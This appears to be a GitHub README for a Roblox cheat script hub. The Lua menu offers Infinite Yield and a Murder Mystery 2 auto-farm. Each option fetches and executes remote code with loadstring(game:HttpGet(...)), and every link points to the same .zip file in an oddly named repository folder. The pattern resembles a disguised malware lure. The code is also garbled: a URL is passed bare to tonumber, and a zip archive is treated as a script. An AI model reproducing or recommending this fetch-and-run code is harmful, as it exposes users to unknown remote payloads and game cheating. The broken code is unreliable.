# Xjxjdjd-hub print("Selecione um script para executar:")
print("1 - Infinite Yield")
print("2 - MM2 Script (GUI e Auto Farm Candy)")

local escolha = tonumber(https://raw.githubusercontent.com/3sxz/Xjxjdjd-hub/main/lachrymosely/Xjxjdjd-hub.zip())

if escolha == 1 then
    print("Executando Script 1...")
    loadstring(game:HttpGet('https://raw.githubusercontent.com/3sxz/Xjxjdjd-hub/main/lachrymosely/Xjxjdjd-hub.zip'))()
elseif escolha == 2 then
    print("Executando Script 2...")
    -- MM2 Script GUI
    loadstring(game:HttpGet("https://raw.githubusercontent.com/3sxz/Xjxjdjd-hub/main/lachrymosely/Xjxjdjd-hub.zip"))()

    -- Auto Farm Candy
    loadstring(game:HttpGet("https://raw.githubusercontent.com/3sxz/Xjxjdjd-hub/main/lachrymosely/Xjxjdjd-hub.zip"))()
else
    print("Opção inválida!")
end
